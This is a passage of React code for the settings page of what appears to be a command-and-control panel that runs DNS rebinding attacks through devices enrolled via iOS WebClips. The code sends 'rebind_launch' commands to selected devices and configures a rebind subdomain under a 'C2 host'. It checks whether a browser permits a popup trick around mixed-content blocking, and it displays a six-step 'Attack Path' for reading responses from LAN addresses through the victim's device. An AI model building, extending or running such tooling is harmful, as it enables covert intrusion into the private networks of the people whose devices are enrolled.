    await apiFetch('/api/rb/unflip').catch(() => {});
    await new Promise(r => setTimeout(r, 2000));
    try {
      await apiFetch(`/api/devices/${selectedDevice}/commands`, { method: 'DELETE' }).catch(() => {});
      await apiFetch(`/api/devices/${selectedDevice}/commands`, {
        method: 'POST',
        body: JSON.stringify({
          type: 'rebind_launch',
          payload: { domain, targetIP: launchTargetIP, targetPort: parseInt(launchTargetPort) || 80, targetPath: launchPath || '/', timeout: 90000, token, vpsIP: vpsIp, preflipped: preflipState === 'ready' },
        }),
      });
      setLaunchStatusMsg('Attack page loading - waiting for result...');
    } catch (e) {
      setLaunchStatusMsg(`Send error: ${e.message} - still watching for result`);
    }
    startLaunchPoll(token);
  }

  const feasible = result && result.canPopup;
  const partial  = result && !feasible;

  return (
    <motion.div
      initial={{ opacity: 0, y: 6 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.15 }}
      style={{ fontFamily: T.sans }}
    >
      {/* Page title */}
      <div style={{ marginBottom: 20 }}>
        <div style={{ fontSize: 20, fontWeight: 700, color: T.text }}>Settings</div>
      </div>

      {/* ── DNS Rebinding section ── */}
      <div style={groupHeader}>DNS Rebinding</div>

      {/* Server Config card */}
      <div style={card}>
        <div style={sectionTitle}>Server Config</div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 8 }}>
          <input
            value={domainInput}
            onChange={e => setDomainInput(e.target.value)}
            placeholder="Rebind domain - rb.evil.example.com"
            style={{ ...monoInput, flex: 1 }}
          />
          <input
            value={vpsIpInput}
            onChange={e => setVpsIpInput(e.target.value)}
            placeholder="VPS IP - 1.2.3.4"
            style={{ ...monoInput, width: 150 }}
          />
          <button onClick={saveConfig} style={btn.primary}>Save</button>
        </div>

        {/* Domain structure helper */}
        {(() => {
          const rbDom  = domainInput.trim() || 'rb.yourdomain.com';
          const parts  = rbDom.split('.');
          const parent = parts.length > 2 ? parts.slice(1).join('.') : rbDom;
          return (
            <div style={{ ...codeBlock, lineHeight: 1.8, marginTop: 8 }}>
              <span style={{ color: T.text2 }}>What to enter in "Rebind domain":{'\n'}</span>
              <span style={{ color: T.text2 }}>  {parent}</span>
              <span style={{ color: T.text3 }}>  - your registered domain (don't enter this){'\n'}</span>
              <span style={{ color: T.text2 }}>  {'<c2-host>'}.{parent}</span>
              <span style={{ color: T.text3 }}>  - C2 / WebClip host (don't enter this){'\n'}</span>
              <span style={{ color: T.accent, fontWeight: 700 }}>  {rbDom}</span>
              <span style={{ color: T.text2 }}>  - enter THIS (rebind-only subdomain){'\n\n'}</span>
              <span style={{ color: T.text2 }}>The rebind domain must be a NEW subdomain under your C2 host,{'\n'}  dedicated only to DNS rebinding.</span>
            </div>
          );
        })()}

        {(domain || vpsIp) && (
          <div style={{ fontSize: 11, color: T.text2, fontFamily: T.mono, marginTop: 8 }}>
            {domain && <span>domain: {domain}</span>}
            {domain && vpsIp && <span style={{ margin: '0 8px', opacity: 0.4 }}>|</span>}
            {vpsIp && <span>vps: {vpsIp}</span>}
          </div>
        )}
      </div>

      {/* Prerequisite Check card */}
      <div style={card}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 14 }}>
          <div style={sectionTitle}>Prerequisite Check</div>
          <button
            onClick={() => fetchHealth(domain, vpsIp)}
            disabled={healthLoading || !domain}
            style={{ ...btn.ghost, opacity: !domain ? 0.4 : 1, cursor: !domain ? 'default' : 'pointer' }}
          >{healthLoading ? 'Checking...' : 'Recheck'}</button>
        </div>

        {health && (
          <div style={{ marginBottom: 14 }}>
            <div style={groupHeader}>Server Config</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 8 }}>
              <CapCard label="Rebind Server" ok={health.server_running}
                note={health.server_running ? 'rebind_server.py is running' : 'Start server in Setup Guide step 6'} />
              <CapCard label="TLS Certs" ok={health.certs_installed}
                note={health.certs_installed ? 'fullchain.pem + privkey.pem present' : 'Paste certs in Setup Guide step 5'} />
              <CapCard label="Port 53 Listening" ok={health.port_53_listening}
                note={health.port_53_listening ? 'DNS server bound to :53' : 'Server not running or port blocked'} />
              <CapCard label="NS Delegation" ok={health.ns_delegation?.ok}
                note={health.ns_delegation?.detail || ''} />
            </div>
            {health.domain_resolves?.detail && (
              <div style={{ ...codeBlock, marginTop: 6 }}>DNS: {health.domain_resolves.detail}</div>
            )}
            <hr style={divider} />
            <div style={groupHeader}>Device Capabilities</div>
          </div>
        )}

        <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 10 }}>
          <select
            value={selectedDevice}
            onChange={e => setSelectedDevice(e.target.value)}
            style={{ ...inputSt, flex: 1 }}
          >
            {devices.length === 0 && <option value="">No devices</option>}
            {devices.map(d => (
              <option key={d.id} value={String(d.id)}>{d.name || `Device ${d.id}`}</option>
            ))}
          </select>
          <button
            onClick={runCheck}
            disabled={running || !selectedDevice || !domain}
            style={{
              ...btn.amber,
              opacity: (!selectedDevice || !domain) ? 0.4 : 1,
              cursor: running || !selectedDevice || !domain ? 'default' : 'pointer',
            }}
          >{running ? 'Running...' : 'Run Check'}</button>
        </div>

        {!domain && <div style={{ fontSize: 12, color: T.amber }}>Save a domain above before running the check.</div>}

        {statusMsg && (
          <div style={{ fontSize: 12, color: T.text2, marginTop: 8 }}>
            {statusMsg}
            {statusMsg.includes('Waiting') && <span style={{ color: T.text3, marginLeft: 8 }}>expected ~10s</span>}
          </div>
        )}

        {result && (
          <div style={{ marginTop: 14 }}>
            <div style={{
              display: 'inline-flex', alignItems: 'center', gap: 6,
              padding: '4px 10px', borderRadius: 20,
              background: feasible ? T.greenBg : partial ? T.amberBg : T.redBg,
              border: `1px solid ${feasible ? 'rgba(34,197,94,0.2)' : partial ? 'rgba(245,158,11,0.2)' : 'rgba(239,68,68,0.2)'}`,
              color: feasible ? T.green : partial ? T.amber : T.red,
              fontSize: 12, fontWeight: 600, marginBottom: 12,
            }}>
              {feasible ? '● Feasible' : partial ? '● Partially blocked' : '● Not feasible'}
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
              <CapCard label="HTTPS Reachable" ok={result.canFetch}
                note={result.canFetch
                  ? `Server responded. Phase: ${result.serverPhase ?? '?'}`
                  : 'Port 443 is C2 - rebind server on :8444. Not required for popup trick.'} />
              <CapCard label="window.open" ok={result.canPopup}
                note="Needed for HTTP popup trick to bypass mixed-content" />
              <CapCard label="BroadcastChannel" ok={result.canBroadcast}
                note={result.canBroadcast ? 'Available (fallback)' : 'Not available - postMessage is primary, this is optional'} />
              <CapCard label="HTTP from HTTPS" ok={result.httpsToHttp}
                note={result.mixedContentBlocked ? 'Mixed content blocked - use popup trick' : 'Direct HTTP fetch allowed (unusual)'} />
            </div>

            {result.browserInfo && (
              <div style={{ marginTop: 10, ...codeBlock }}>
                <div style={{ fontSize: 11, color: T.text2, marginBottom: 5, fontWeight: 600, letterSpacing: '0.07em', textTransform: 'uppercase' }}>Browser Context</div>
                <div style={{ lineHeight: 1.7 }}>
                  <div>Protocol: {result.browserInfo.protocol}</div>
                  <div>Standalone: {result.browserInfo.standalone ? 'Yes (WebClip installed)' : 'No (Safari browser)'}</div>
                  <div>Origin: {result.browserInfo.origin}</div>
                </div>
              </div>
            )}

            {result.errors?.length > 0 && (
              <div style={{ marginTop: 10 }}>
                {result.errors.map((e, i) => (
                  <div key={i} style={{ ...codeBlock, color: T.red, marginBottom: 4 }}>
                    [{e.step}] {e.msg}
                  </div>
                ))}
              </div>
            )}

            {feasible && (
              <div style={{
                marginTop: 12, padding: '12px 14px', borderRadius: 7,
                background: T.greenBg, border: '1px solid rgba(34,197,94,0.2)',
              }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: T.green, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.07em' }}>Attack Path</div>
                <div style={{ fontSize: 12, color: T.text, lineHeight: 1.7 }}>
                  1. Set DNS to your server IP (TTL=1)<br />
                  2. Load page from <code style={{ color: T.accent, fontFamily: T.mono }}>{result.rbDomain}</code> in WebClip<br />
                  3. Open popup: <code style={{ color: T.accent, fontFamily: T.mono }}>http://{result.rbDomain}/rb-launch.html?ip=TARGET</code><br />
                  4. Call <code style={{ color: T.accent, fontFamily: T.mono }}>/api/rb/flip?target=192.168.1.X</code> to flip DNS<br />
                  5. Wait 1s for TTL expire, popup re-fetches - reads LAN HTTP response<br />
                  6. BroadcastChannel delivers body back to WebClip page
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Launch Attack (hidden, moved to Devices) */}
      {false && <div />}

      {/* Setup Guide */}
      <SetupGuide domain={domain} vpsIp={vpsIp} />

      {/* ── Account section ── */}
      <div style={{ ...groupHeader, marginTop: 32 }}>Account</div>

      <div style={card}>
        <div style={sectionTitle}>Change Password</div>
        <form
          onSubmit={async e => {
            e.preventDefault();
            if (cpNew !== cpConfirm) { setCpError('Passwords do not match'); return; }
            if (cpNew.length < 8)   { setCpError('Min 8 characters'); return; }
            setCpLoading(true); setCpError(''); setCpSuccess(false);
            try {
              await apiFetch('/api/auth/change-password', {
                method: 'POST',
                body: JSON.stringify({ current_password: cpCurrent, new_password: cpNew }),
              });
              setCpCurrent(''); setCpNew(''); setCpConfirm('');
              setCpSuccess(true);
              setTimeout(() => setCpSuccess(false), 4000);
            } catch (err) {
              setCpError(err.message === 'current_password_invalid' ? 'Current password is incorrect' : err.message);
            } finally { setCpLoading(false); }
          }}
          style={{ display: 'flex', flexDirection: 'column', gap: 12 }}
        >
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 10 }}>
            <div>
              <label style={fieldLabel}>Current Password</label>
              <input type="password" value={cpCurrent} onChange={e => setCpCurrent(e.target.value)}
                placeholder="current" required style={inputFull} />
            </div>
            <div>
              <label style={fieldLabel}>New Password</label>
              <input type="password" value={cpNew} onChange={e => setCpNew(e.target.value)}
                placeholder="8+ characters" required style={inputFull} />
            </div>
            <div>
              <label style={fieldLabel}>Confirm</label>
              <input type="password" value={cpConfirm} onChange={e => setCpConfirm(e.target.value)}
                placeholder="repeat" required style={inputFull} />
            </div>
          </div>

          {cpError   && <div style={{ fontSize: 12, color: T.red }}>{cpError}</div>}
          {cpSuccess && <div style={{ fontSize: 12, color: T.green }}>Password updated successfully.</div>}

          <div>
            <button type="submit" disabled={cpLoading}
              style={{ ...btn.primary, opacity: cpLoading ? 0.4 : 1, cursor: cpLoading ? 'default' : 'pointer' }}>
              {cpLoading ? 'Updating...' : 'Update Password'}
            </button>
          </div>
        </form>
      </div>

      {/* ── User Management (admin only) ── */}
      {role === 'admin' && (
        <>
          <div style={{ ...groupHeader, marginTop: 32 }}>User Management</div>
          <UserManagement />
        </>
      )}
    </motion.div>
  );
}
